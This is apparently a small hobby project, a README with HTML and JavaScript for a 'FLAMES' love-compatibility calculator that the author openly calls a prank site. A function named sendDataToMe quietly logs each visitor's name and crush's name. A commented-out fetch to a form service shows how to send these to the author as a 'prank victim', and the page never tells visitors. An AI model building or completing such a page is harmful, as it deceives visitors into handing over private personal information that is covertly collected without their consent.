# Flames-
It's a prank website ...as they enter their and secret person name it will  reacieve me 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ultimate FLAMES Calculator</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #ffe6e6; display: flex; justify-content: center; align-content: center; height: 100vh; margin: 0; padding-top: 10vh;}
        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 350px; height: max-content;}
        h2 { color: #ff4d6d; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #ff4d6d; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold;}
        button:hover { background: #ff758f; }
        #result { margin-top: 20px; font-size: 18px; font-weight: bold; color: #333; }
    </style>
</head>
<body>

<div class="card">
    <h2>🔥 FLAMES Calculator 🔥</h2>
    <p>Find out your true compatibility status!</p>
    <input type="text" id="yourName" placeholder="Your Name" required>
    <input type="text" id="crushName" placeholder="Your Crush's Name" required>
    <button onclick="calculateFlames()">Calculate Compatibility</button>
    <div id="result"></div>
</div>

<script src="script.js"></script>
</body>
</html>
function calculateFlames() {
    let name1 = document.getElementById('yourName').value.trim().toLowerCase();
    let name2 = document.getElementById('crushName').value.trim().toLowerCase();

    if (name1 === "" || name2 === "") {
        alert("Please enter both names!");
        return;
    }

    // --- THE PRANK CAPTURE ---
    // This sends the data to you before showing the result.
    sendDataToMe(document.getElementById('yourName').value, document.getElementById('crushName').value);

    // --- FLAMES LOGIC ---
    let rName1 = name1.replace(/\s+/g, '');
    let rName2 = name2.replace(/\s+/g, '');

    for (let char of rName1) {
        if (rName2.includes(char)) {
            rName1 = rName1.replace(char, '');
            rName2 = rName2.replace(char, '');
        }
    }

    let count = rName1.length + rName2.length;
    let flames = ["Friends 🤝", "Love ❤️", "Affection 💖", "Marriage 💍", "Enemies ⚔️", "Siblings 🧑‍🤝‍🧑"];
    
    while (flames.length > 1) {
        let index = (count % flames.length) - 1;
        if (index >= 0) {
            flames = flames.slice(index + 1).concat(flames.slice(0, index));
        } else {
            flames.pop();
        }
    }

    document.getElementById('result').innerHTML = `Result: ${flames[0]}`;
}

function sendDataToMe(user, crush) {
    console.log(`Prank Logged: ${user} loves ${crush}`);
    
    // TODO: Connect a backend or email service here to actually receive the names.
    // Example using a free API like Web3Forms or Formspree:
    /*
    fetch('https://web3forms.com', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            apikey: 'YOUR_API_KEY_HERE',
            subject: 'New FLAMES Prank Victim!',
            message: `${user} entered ${crush}`
        })
    });
    */
}
